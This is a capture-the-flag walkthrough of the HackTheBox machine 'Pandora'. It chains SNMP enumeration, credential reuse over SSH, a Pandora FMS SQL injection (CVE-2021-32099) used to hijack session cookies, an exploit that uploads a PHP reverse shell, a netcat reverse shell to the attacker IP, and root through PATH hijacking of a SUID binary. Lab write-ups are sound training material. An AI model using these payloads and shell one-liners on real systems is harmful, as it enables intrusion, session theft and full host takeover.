# Pandora: Easy

```sh
sudo vim /etc/hosts
# add pandora.htb

nmap -T4 -p- -A -Pn -v pandora.htb
# TCP scan

sudo nmap -sU -Pn -v pandora.htb
# UDP scan
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
    * 80/tcp: http: Apache httpd 2.4.41

* we can also check with a UDP scan to find any other services, and we get an open port 161/udp for ```snmp```

* we can check the SNMP service first:

    ```sh
    snmpwalk -v2c -c public pandora.htb
    # query OIDs with a common community string like 'public'
    # this works
    ```

* ```snmpwalk``` is able to enumerate the OIDs with 'public' as the community string, and we get a lot of info but it takes some time:

    * version info: 'Linux pandora 5.4.0-91-generic #102-Ubuntu'
    * certain strings: 'Daniel', 'pandora', 'Mississippi'
    * a lot of process info is shown, which includes a string: ```-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'```

* from the SNMP output, we have a potential user 'daniel', and possible password strings like 'pandora', 'Mississipppi', and 'HotelBabylon23'

* checking the webpage on port 80, we have the landing page for 'PLAY', a website for network monitoring solutions

* we can enumerate the webpage and its content for any info:

    * the website mentions a subdomain 'panda.htb': we can update this in ```/etc/hosts``` - but this page leads to the same website

    * the footer mentions 2 email addresses: 'support@panda.htb' & 'contact@panda.htb'

    * the page has a contact form at the end, but it just sends a GET request with the data, so does not look like it is of use

    * the webpage does not have any outgoing links, but has several files from the '/assets' folder

    * checking the '/assets' directory, we have a directory listing: we can check the subdirectories for any interesting files

    * the '/assets' directory does not include any interesting files

* we can try logging in as 'daniel' via SSH using the possible password strings found earlier, before opting for web enum:

    ```sh
    ssh daniel@pandora.htb
    # this works for password 'HotelBabylon23'

    ls -la
    # no user flag here

    sudo -l
    # cannot run as 'sudo'

    ls -la /home
    # we have 2 users - 'daniel' and 'matt'

    ls -la /home/matt
    # this directory contains user flag

    ls -la /

    ls -la /var/

    ls -la /var/www
    # enumerate web files
    # we have folders 'html' and 'pandora'

    ls -la /var/www/html
    # for the main website

    ls -la /var/www/pandora
    # contains a folder 'pandora_console'

    cat /var/www/pandora/index.html
    # refers a URL '/pandora_console'

    ls -la /var/www/pandora/pandora_console
    # check all files recursively

    cat /var/www/pandora/pandora_console/ajax.php

    cat /var/www/pandora/pandora_console/audit.log
    ```

* enumerating the system as user 'daniel', we have another user 'matt' with possible higher privileges

* checking the web directory shows another website named 'pandora_console': this has multiple files, so we can check all of them for any secrets:

    * the file ```/var/www/pandora/pandora_console/ajax.php``` mentions a package 'Pandora FMS'

    * Googling shows that it is referring to Pandora: a network monitoring solution

    * the file ```/var/www/pandora/pandora_console/audit.log``` gives us the usernames 'matt', 'admin' and 'daniel'

    * we have a config file at ```/var/www/pandora/pandora_console/include/config.php```, but we do not have access to read it

    * we have 2 SQL-related files: we can try checking them by transferring it to the attacker machine, but these files do not reveal anything other than the DB structure and schema

* we can attempt enumeration using ```linpeas``` as well: fetch the script from attacker:

    ```sh
    wget http://10.10.14.48:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * box is running Linux version 5.4.0-91-generic, Ubuntu 20.04.3
    * locally listening on port 3306
    * unknown SUID binary ```/usr/bin/pandora_backup``` - but executable privileges for user 'matt' only
    * subdomain 'pandora.panda.htb' found from the file ```/etc/apache2/sites-enabled/pandora.conf```
    * executable file ```/usr/bin/host_check``` mentioned

* as we have an additional subdomain found: 'pandora.panda.htb': we can update it to ```/etc/hosts``` on attacker

* however, the 'pandora.conf' file configures the subdomain such that it can be accessed locally on port 80 only:

    ```html
    <VirtualHost localhost:80>
    ServerAdmin admin@panda.htb
    ServerName pandora.panda.htb
    DocumentRoot /var/www/pandora
    AssignUserID matt matt
    <Directory /var/www/pandora>
        AllowOverride All
    </Directory>
    ErrorLog /var/log/apache2/error.log
    CustomLog /var/log/apache2/access.log combined
    </VirtualHost>
    ```

* because of this config, if we try to visit the domain 'http://pandora.panda.htb/pandora_console/', we would be unable to access the webpage and get a 404 Not Found error

* we need to use local port forwarding to access the webpage on port 80, on a port on our attacker:

    ```sh
    # on attacker
    ssh -L 1234:localhost:80 daniel@pandora.htb
    ```

* by port forwarding, we can access the local-only webpage on attacker port 1234

* if we navigate to 'http://localhost:1234' now, we are redirected to 'http://localhost:1234/pandora_console/': a login page for the Pandora FMS Next Generation software

* the footer contains the version info: 'v7.0NG.742_FIX_PERL2020'

* Googling for exploits associated with this release leads to [CVE-2020-5844: a RCE exploit for authenticated admins to upload and execute malicious PHP scripts](https://www.sentinelone.com/vulnerability-database/cve-2020-5844/)

* as authentication is required, we need to log into Pandora FMS first

* Googling for default creds gives creds like 'admin:pandora' and 'root:pandora': but these creds, as well as common creds like 'admin:admin' do not work

* if we try to re-use the creds 'daniel:HotelBabylon23', we get the error 'User can only use the API'

* the exploit requires a login to the webpage so we cannot use the creds for 'daniel'

* Googling for other exploits affecting this version leads to [CVE-2021-32099: a pre-authentication SQLi exploit](https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained)

* Googling for exploit POCs for CVE-2021-32099 leads to this [GitHub repo with the following POC](https://github.com/ibnuuby/CVE-2021-32099):

    ```sh
    http://localhost:8000/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
    ```

* this exploits the SQLi vuln in the 'chart_generator.php' file to execute the command ```a' UNION SELECT 'a',1,'id_usuario|s:5:"admin";' as data FROM tsessions_php WHERE '1'='1```, which fetches the data from the table 'tsessions_php'

* modifying the POC to reflect the correct values, if we visit the URL 'http://localhost:1234/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271', we get an empty page

* changing the column values or names gives us other SQL errors or access denied messages

* we can try using ```sqlmap``` with the payload query and try to dump the data:

    ```sh
    sqlmap -u 'http://localhost:1234/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271' --dump
    ```

* this works and ```sqlmap``` fetches a lot of tables for the database 'pandora': but a lot of the contents cannot be fetched due to 'permission denied' errors

* the table 'tsessions_php' contains some useful data, as it has the session values for multiple active sessions: we can fetch only this table's contents:

    ```sh
    sqlmap -u 'http://localhost:1234/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271' --dump -T tsessions_php
    ```

* this gives us the cookie values from the 'id_session' parameter for multiple users: 'daniel', 'admin' & 'matt'

* as we have to pivot to the user 'matt', we can try using the session cookie values for this user

* navigating back to the Pandora FMS login page, we have the 'PHPSESSID' cookie set: we can modify the value to the cookie values for 'matt' from 'tsessions_php' table; one of the cookie values work

* if we refresh the page after modifying the cookie value, we are logged in as 'matt' now and redirected to the dashboard page

* as we have authenticated access to Pandora FMS, we can try the previously-found exploit CVE-2020-5844 to get RCE

* first, we can navigate to the user profile settings, and modify the user's password to a new password like 'TestPass123'

* next, we can try the [exploit POC](https://github.com/TheCyberGeek/CVE-2020-5844) manually, but this fails as 'matt' is not an authenticated admin

* Googling for other approaches to get RCE via authenticated user leads to [this SQLi POC](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated): where the admin user is impersonated to get a shell

* we can try running this exploit:

    ```sh
    cp /usr/share/webshells/php/php-reverse-shell.php revshell.php

    vim revshell.php
    # modify IP, port values

    python3 sqlpwn.py -t localhost:1234 -f revshell.php
    # the PHP file is just for uploading
    # but the webshell is created in the exploit code itself

    # this works and we get a command shell
    ```

* the exploit works and we have RCE as 'matt' now: but the shell is very limited:

    ```sh
    id
    # 'matt'

    ls -la /home/matt

    cat /home/matt/user.txt
    # user flag
    ```

* we can try using a reverse shell one-liner and upgrade the shell:

    ```sh
    # on attacker
    nc -nvlp 5555
    # setup listener
    ```

    ```sh
    # in command shell
    busybox nc 10.10.14.48 5555 -e sh
    # this works
    ```

    ```sh
    # in new reverse shell, stabilise it

    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    cd /home/matt

    ls -la

    sudo -l
    # error - 'sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted'
    # 'sudo: unable to initialize policy plugin'
    ```

* as the ```sudo``` command does not work properly, we can try creating SSH keys and then testing to see if it works:

    ```sh
    # on target
    
    mkdir .ssh

    cd .ssh
    ```

    ```sh
    # on attacker
    ssh-keygen -f matt
    # create keys
    # new passphrase is needed, as without passphrase it fails for some reason

    chmod 600 matt

    cat matt.pub
    # copy the public key
    ```

    ```sh
    # on target
    echo "ssh-rsa ..." > authorized_keys
    # paste public key into file

    chmod 600 authorized_keys
    ```

* now we can SSH into the target as 'matt':

    ```sh
    ssh -i matt matt@pandora.htb
    # use the passphrase set earlier
    # this works

    sudo -l
    # this still requires a password - which we do not have

    # check the config file for Pandora now for any secrets

    ls -la /var/www/pandora/pandora_console

    cat /var/www/pandora/pandora_console/include/config.php
    ```

* the Pandora config file discloses the MySQL DB creds 'pandora:PandoraFMSSecurePass2021' for the 'pandora' DB

* we can try checking the DB for any user hashes:

    ```sh
    mysql -u pandora -p -D pandora -e "show tables"
    # check the tables

    # we can check the 'tusuario' table for any user hashes

    mysql -u pandora -p -D pandora -e "select * from tusuario"
    # this prints hashes
    ```

* we can try cracking the user hashes from 'tusuario' table, but this does not give anything

* as we have access as 'matt' now, we can try executing the previously-found SUID-bit executable ```/usr/bin/pandora_backup```:

    ```sh
    ls -la /usr/bin/pandora_backup

    /usr/bin/pandora_backup
    # this gives a lot of output
    ```

* running the binary shows that it is for backing up the PandoraFMS client, and it uses ```tar``` to create the backup for all files, recursively

* we can try to check this binary further by transferring it to the attacker:

    ```sh
    # on attacker

    nc -nvlp 6666 > pandora_backup
    ```

    ```sh
    # in reverse shell

    nc 10.10.14.48 6666 -w 3 < /usr/bin/pandora_backup
    ```

    ```sh
    # on attacker

    strings pandora_backup
    ```

* using the ```strings``` command reveals the ```tar``` command being run by the binary:

    ```sh
    tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
    ```

* as the wildcard character is being used, we can try to [abuse it using the checkpoint feature in tar](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/): but this does not work and we get the same error as before

* checking the ```strings``` output again, we can see that the ```tar``` binary is mentioned, but it is not an absolute path like ```/usr/bin/tar```; instead a relative path is used

* we can try to abuse PATH variable by injecting a malicious binary named as ```tar```:

    ```sh
    echo $PATH

    echo "/bin/sh" > tar
    # create a 'tar' program for launching a shell

    chmod +x tar

    export PATH=.:${PATH}
    # export current directory to PATH var

    echo $PATH
    # verify the change

    /usr/bin/pandora_backup
    # this works and we get root shell

    id
    # root

    cat /root/root.txt
    # root flag
    ```
